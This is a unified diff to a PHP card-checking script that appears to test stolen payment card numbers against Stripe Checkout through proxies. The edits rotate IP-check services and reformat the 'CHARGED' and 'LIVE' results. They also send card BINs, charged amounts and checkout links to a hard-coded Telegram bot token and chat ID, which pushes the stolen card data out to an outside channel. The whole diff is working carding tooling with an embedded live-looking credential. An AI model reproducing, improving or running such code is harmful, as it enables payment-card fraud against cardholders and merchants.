@@ -63,9 +63,16 @@ $proxyauth = !empty($hydra) ? $hydra : '';
 
 $domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
 
+$ip_api_urls = array(
+    'https://ipinfo.io/ip',
+    'https://api.ipify.org/',
+    'https://checkip.amazonaws.com/',
+    'https://icanhazip.com/',
+    'https://ipapi.co/ip/'
+);
+$testmyip = $ip_api_urls[array_rand($ip_api_urls)];
 $ch = curl_init();
-$testmyip = 'https://api.ipify.org/';
-curl_setopt($ch, CURLOPT_URL,$testmyip);
+curl_setopt($ch, CURLOPT_URL, $testmyip);
 if (!empty($proxy)) {
     curl_setopt($ch, CURLOPT_PROXY, $proxy);
     if (!empty($proxyauth)) {
@@ -79,7 +86,7 @@ $curl_error = curl_error($ch);
 curl_close($ch);
 
 if ($curl_error) {
-    echo "<span style='background-color: white; color: red;' class='badge'>$curl_error</span><br><br>";
+    echo "<span style='background-color: white; color: red;' class='badge'>$curl_error</span><br>";
     exit();
 }
 
@@ -333,17 +340,19 @@ if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
     $scheme = '';
 }
 
+$xamount = intval($xamount)/100;
+
 #############SEND TO TG BOT WHEN CHARGED
 $botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
 $chatID = urlencode('-1001808253666');
-$charged_message = 'Successfull%20Checkout%0A%0ABIN:%0A'.$lista.'%0A%0AURL:%0A'.$success.'%0A%0AAmount:%0A'.strtoupper($currency).'%20'.($xamount / 100).'%0A%0AChecked%20from:%0A'.$domain.'';
-$sendcharged = 'https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $chatID . '&text='.$charged_message.'';
+$charged_message = 'Successfull%20Checkout%0A%0ABIN:%0A'.$lista.'%0A%0AURL:%0A'.urlencode($success).'%0A%0AAmount:%0A'.strtoupper($currency).'%20'.$xamount.'%0A%0AChecked_from:%0A'.$domain.'';
+$sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.$charged_message.'';
 
 #############SEND TO TG BOT WHEN INSUFFBAL
 $botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
 $chatID = urlencode('-1001808253666');
-$insuf_message = 'INSUFFICIENT%20FUNDS%0A%0ABIN:%0A'.$lista.'%0A%0AAmount%20to%20bill:%0A'.strtoupper($currency).'%20'.($xamount / 100).'%0A%0AStripe%20Checkout%20link:%0A'.$colink.'%0A%0AChecked%20from:%0A'.$domain.'';
-$sendinsuff = 'https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $chatID . '&text='.$insuf_message.'';
+$insuf_message = 'INSUFFICIENT%20FUNDS%0A%0ABIN:%0A'.$lista.'%0A%0AAmount_to_bill:%0A'.strtoupper($currency).'%20'.$xamount.'%0A%0AStripe%20Checkout%20link:%0A'.$colink.'%0A%0AChecked_from:%0A'.$domain.'';
+$sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.$insuf_message.'';
 
 #############BOT RETRY TO SEND IF ITS NOT WORKS
 $max_retries = 3;
@@ -354,11 +363,10 @@ $sendinsufftotg = false;
 
 #############SUCCEEDED SUCCESS
  if (strpos($result1, '"status": "succeeded"')) {
-    echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'  target='_blank'>[ proof here ]</a> -Alice Schuberg</span> ";
     while (!$sendchargedtotg && $num_retries < $max_retries) {
     $sendchargedtotg = @file_get_contents($sendcharged);
     $num_retries++;
-    echo "\u{1F4B0}\u{2705}<br>"; // outputs 💰✅
+    echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'  target='_blank'>[ proof here ]</a> -Alice Schuberg 💰✅</span>";
 }
     exit();
 }
@@ -381,11 +389,10 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($curl0, '"insufficient_funds"')) {
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span> ";
     while (!$sendinsufftotg && $num_retries < $max_retries) {
     $sendinsufftotg = @file_get_contents($sendinsuff);
     $num_retries++;
-    echo "\u{1F4B8}\u{274C}<br>"; // outputs 💸❌
+    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span>";
 }
     exit();
 }
@@ -420,11 +427,10 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($curl1, '"insufficient_funds"')) {
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span> ";
     while (!$sendinsufftotg && $num_retries < $max_retries) {
     $sendinsufftotg = @file_get_contents($sendinsuff);
     $num_retries++;
-    echo "\u{1F4B8}\u{274C}<br>"; // outputs 💸❌
+    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span>";
 }
     exit();
 }
@@ -455,11 +461,10 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($result1, '"insufficient_funds"')) {
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span> ";
     while (!$sendinsufftotg && $num_retries < $max_retries) {
     $sendinsufftotg = @file_get_contents($sendinsuff);
     $num_retries++;
-    echo "\u{1F4B8}\u{274C}<br>"; // outputs 💸❌
+    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span>";
 }
     exit();
 }
